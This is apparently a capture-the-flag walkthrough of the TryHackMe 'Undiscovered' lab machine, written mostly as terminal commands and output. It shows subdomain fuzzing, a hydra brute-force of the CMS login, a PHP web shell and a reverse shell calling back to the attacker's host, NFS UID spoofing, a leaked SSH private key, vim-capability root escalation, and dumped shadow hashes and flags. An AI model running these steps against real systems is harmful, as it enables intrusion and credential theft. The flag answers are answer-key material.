----
Discovery consists not in seeking new landscapes, but in having new eyes..
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/8cb5aae2040b1e4c66926f9d92f1c573.jpeg)

### Task 1  Capture The Flag

 Start Machine

Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with [@H0j3n](https://tryhackme.com/p/H0j3n), thanks to him for the foothold and privilege escalation ideas. 

Please consider adding **undiscovered.thm** in /etc/hosts  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts         
10.10.135.201 undiscovered.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.135.201 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.135.201:22
Open 10.10.135.201:80
Open 10.10.135.201:111
Open 10.10.135.201:2049
Open 10.10.135.201:42328
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 10:48 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Initiating Connect Scan at 10:48
Scanning undiscovered.thm (10.10.135.201) [5 ports]
Discovered open port 22/tcp on 10.10.135.201
Discovered open port 111/tcp on 10.10.135.201
Discovered open port 80/tcp on 10.10.135.201
Discovered open port 2049/tcp on 10.10.135.201
Discovered open port 42328/tcp on 10.10.135.201
Completed Connect Scan at 10:48, 0.18s elapsed (5 total ports)
Initiating Service scan at 10:48
Scanning 5 services on undiscovered.thm (10.10.135.201)
Completed Service scan at 10:48, 8.48s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.135.201.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 5.75s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.84s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Nmap scan report for undiscovered.thm (10.10.135.201)
Host is up, received user-set (0.18s latency).
Scanned at 2023-08-20 10:48:34 EDT for 15s

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0m4DmvKkWm3OoELtyKxq4G9yM29DEggmEsfKv2fzZh1G6EiPS/pKPQV/u8InqwPyyJZv82Apy4pVBYL7KJTTZkxBLbrJplJ6YnZD5xZMd8tf4uLw5ZCilO6oLDKH0pchPmQ2x2o5x2Xwbzfk4KRbwC+OZ4f1uCageOptlsR1ruM7boiHsPnDO3kCujsTU/4L19jJZMGmJZTpvRfcDIhelzFNxCMwMUwmlbvhiCf8nMwDaBER2HHP7DKXF95uSRJWKK9eiJNrk0h/K+3HkP2VXPtcnLwmbPhzVHDn68Dt8AyrO2d485j9mLusm4ufbrUXSyfM9JxYuL+LDrqgtUxxP
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAcr7A7L54JP/osGx6nvDs5y3weM4uwfT2iCJbU5HPdwGHERLCAazmr/ss6tELaj7eNqoB8LaM2AVAVVGQXBhc8=
|   256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9WA55JtThufX7BcByUR5/JGKGYsIlgPxEiS0xqLlIA
80/tcp    open  http     syn-ack Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      39140/udp   nlockmgr
|   100021  1,3,4      41891/tcp6  nlockmgr
|   100021  1,3,4      42328/tcp   nlockmgr
|   100021  1,3,4      58712/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      syn-ack 2-4 (RPC #100003)
42328/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:48
Completed NSE at 10:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.135.201                       
clnt_create: RPC: Program not registered

<h1>Remember....</h1>

<p>The path should be the darker one...</p>

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u undiscovered.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.undiscovered.thm" --hc 404 --hw 26
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://undiscovered.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000491:   200        68 L     341 W      4584 Ch     "manager"                  
000000522:   200        82 L     341 W      4650 Ch     "deliver"                  
000000516:   200        68 L     341 W      4626 Ch     "dashboard"                
000000566:   200        68 L     341 W      4584 Ch     "newsite"                  
000000612:   200        68 L     341 W      4584 Ch     "develop"                  
000000630:   200        68 L     341 W      4542 Ch     "forms"                    
000000628:   200        68 L     341 W      4584 Ch     "network"                  
000000633:   200        68 L     341 W      4668 Ch     "maintenance"              
000000665:   200        68 L     341 W      4521 Ch     "view"                     
000000685:   200        83 L     341 W      4599 Ch     "booking"                  
000000691:   200        68 L     341 W      4605 Ch     "terminal"                 
000000674:   200        68 L     341 W      4605 Ch     "mailgate"                 
000000678:   200        68 L     341 W      4521 Ch     "play"                     
000000680:   200        68 L     341 W      4542 Ch     "start"                    
000000702:   200        68 L     341 W      4626 Ch     "resources"                
000000694:   200        68 L     341 W      4521 Ch     "gold"                     
000000696:   200        68 L     341 W      4605 Ch     "internet"                 
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 245.3061
Processed Requests: 7488
Filtered Requests: 7471
Requests/sec.: 30.52512

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.135.201 undiscovered.thm manager.undiscovered.thm deliver.undiscovered.thm

http://manager.undiscovered.thm/

Powered by RiteCMS Version:2.2.1

https://www.exploit-db.com/exploits/48636

1- Go to following url. >> http://(HOST)/cms/
2- Default username and password is admin:admin. We must know login credentials.
3- Go to "Filemanager" and press "Upload file" button.
4- Choose your php web shell script and upload it. 
     
PHP Web Shell Code == <?php system($_GET['cmd']); ?>

5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id

http://deliver.undiscovered.thm/cms/

User unknown or password wrong

hydra -- brute forcing

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-20 11:22:25
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-20 11:22:44


http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=media

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                      
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.135.201] 34486
SOCKET: Shell has connected! PID: 1681
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ ls
ls
payload_ivan.php  smilies
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ cd /home
cd /home
www-data@undiscovered:/home$ ls
ls
leonard  william
www-data@undiscovered:/home$ cd william
cd william
bash: cd: william: Permission denied
www-data@undiscovered:/home$ cd leonard
cd leonard
bash: cd: leonard: Permission denied

www-data@undiscovered:/var/www$ ls
ls
booking.undiscovered.thm      manager.undiscovered.thm
dashboard.undiscovered.thm    network.undiscovered.thm
deliver.undiscovered.thm      newsite.undiscovered.thm
develop.undiscovered.thm      play.undiscovered.thm
forms.undiscovered.thm	      resources.undiscovered.thm
gold.undiscovered.thm	      start.undiscovered.thm
html			      terminal.undiscovered.thm
internet.undiscovered.thm     undiscovered.thm
mailgate.undiscovered.thm     view.undiscovered.thm
maintenance.undiscovered.thm

www-data@undiscovered:/var/www/deliver.undiscovered.thm/data/sql$ cat sqlite.user.initial.sql
<www/deliver.undiscovered.thm/data/sql$ cat sqlite.user.initial.sql          
CREATE TABLE rite_userdata (id INTEGER PRIMARY KEY AUTOINCREMENT, name varchar(255) NOT NULL default '', type tinyint(4) NOT NULL default '0', pw varchar(255) NOT NULL default '', last_login int(11) NOT NULL default '0', wysiwyg tinyint(4) NOT NULL default '0');

INSERT INTO rite_userdata VALUES(1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);

www-data@undiscovered:/etc$ cat exports
cat exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william	*(rw,root_squash)

www-data@undiscovered:/etc$ cat /etc/passwd | grep william
cat /etc/passwd | grep william
william:x:3003:3003::/home/william:/bin/bash

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo useradd -u 3003 william

┌──(witty㉿kali)-[~/Downloads]
└─$ cat /etc/passwd | grep william
william:x:3003:3003::/home/william:/bin/sh

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mkdir /home/william

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mount 10.10.135.201:/home/william /home/william

┌──(root㉿kali)-[/home/witty/Downloads]
└─# usermod -- shell /bin/bash william
Usage: usermod [options] LOGIN

Options:
  -a, --append                  append the user to the supplemental GROUPS
                                mentioned by the -G option without removing
                                the user from other groups
  -b, --badname                 allow bad names
  -c, --comment COMMENT         new value of the GECOS field
  -d, --home HOME_DIR           new home directory for the user account
  -e, --expiredate EXPIRE_DATE  set account expiration date to EXPIRE_DATE
  -f, --inactive INACTIVE       set password inactive after expiration
                                to INACTIVE
  -g, --gid GROUP               force use GROUP as new primary group
  -G, --groups GROUPS           new list of supplementary GROUPS
  -h, --help                    display this help message and exit
  -l, --login NEW_LOGIN         new value of the login name
  -L, --lock                    lock the user account
  -m, --move-home               move contents of the home directory to the
                                new location (use only with -d)
  -o, --non-unique              allow using duplicate (non-unique) UID
  -p, --password PASSWORD       use encrypted password for the new password
  -P, --prefix PREFIX_DIR       prefix directory where are located the /etc/* files
  -r, --remove                  remove the user from only the supplemental GROUPS
                                mentioned by the -G option without removing
                                the user from other groups
  -R, --root CHROOT_DIR         directory to chroot into
  -s, --shell SHELL             new login shell for the user account
  -u, --uid UID                 new UID for the user account
  -U, --unlock                  unlock the user account
  -v, --add-subuids FIRST-LAST  add range of subordinate uids
  -V, --del-subuids FIRST-LAST  remove range of subordinate uids
  -w, --add-subgids FIRST-LAST  add range of subordinate gids
  -W, --del-subgids FIRST-LAST  remove range of subordinate gids
  -Z, --selinux-user SEUSER     new SELinux user mapping for the user account

                                                                    
┌──(root㉿kali)-[/home/witty/Downloads]
└─# usermod --shell /bin/bash william 
                                                                    
┌──(root㉿kali)-[/home/witty/Downloads]
└─# su william                                                   
william@kali:/home/witty/Downloads$ cd /home/william/
william@kali:~$ ls
admin.sh  script  user.txt

william@kali:~$ chmod 777 /home/william

www-data@undiscovered:/etc$ cd /home/william
cd /home/william
www-data@undiscovered:/home/william$ ls
ls
admin.sh  script  user.txt

www-data@undiscovered:/home/william$ cat admin.sh
cat admin.sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0

william@kali:~$ ./script
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!


william@kali:~$ ./script 1
/bin/cat: /home/leonard/1: No such file or directory

www-data@undiscovered:/home/william$ ./script .ssh/id_rsa
./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ nano leonard_rsa 
                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 leonard_rsa          
                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i leonard_rsa leonard@10.10.135.201                    
The authenticity of host '10.10.135.201 (10.10.135.201)' can't be established.
ED25519 key fingerprint is SHA256:0ksd7ve03T/DLd54sg0vUZNd72YgJT1g2iL1CP0r9+Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.135.201' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$ ls
leonard@undiscovered:~$ ls -lah
total 36K
drwxr-x--- 5 leonard leonard 4.0K Sep  9  2020 .
drwxr-xr-x 4 root    root    4.0K Sep  4  2020 ..
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 leonard leonard 3.7K Sep  4  2020 .bashrc
drwx------ 2 leonard leonard 4.0K Sep  4  2020 .cache
drwxrwxr-x 2 leonard leonard 4.0K Sep  4  2020 .nano
-rw-r--r-- 1 leonard leonard   43 Sep  4  2020 .profile
drwx------ 2 leonard leonard 4.0K Sep  4  2020 .ssh
-rw------- 1 leonard leonard 6.0K Sep  4  2020 .viminfo

leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep

https://gtfobins.github.io/gtfobins/vim/

┌──(witty㉿kali)-[~/Downloads]
└─$ vim.basic 

leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# cd /root
# ls
root.txt
# cat root.txt
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{8d7b7299cccd1796a61915901d0e091c}

# cat /etc/shadow
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18508:0:99999:7:::
messagebus:*:18508:0:99999:7:::
uuidd:*:18508:0:99999:7:::
dnsmasq:*:18508:0:99999:7:::
sshd:*:18508:0:99999:7:::
mysql:!:18509:0:99999:7:::
statd:*:18509:0:99999:7:::
william:$6$Nxvi9UI5$h.yTVQCnXbfZ7BZT1sZnl4NHF074.uYC9o.1t61vSfHTJTdVBrdxib/QKXUlyOUkjk6FqusGuxCSIlJJsFyfY/:18509:0:99999:7:::
leonard:$6$mOYLO55O$oUzIfZpklQj8M4rumAa5UJWoA1KXBYEsQGAdtJliuJDvSAwweQdGi8bgbz.dDVZ63jUc/UX3/VXRwpCkEI5rQ/:18509:0:99999:7:::
nfsnobody:!:18510:0:99999:7:::


```

![[Pasted image 20230820102834.png]]

user.txt

*THM{8d7b7299cccd1796a61915901d0e091c}*

Whats the root user's password hash?

	*root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0*


[[Debug]]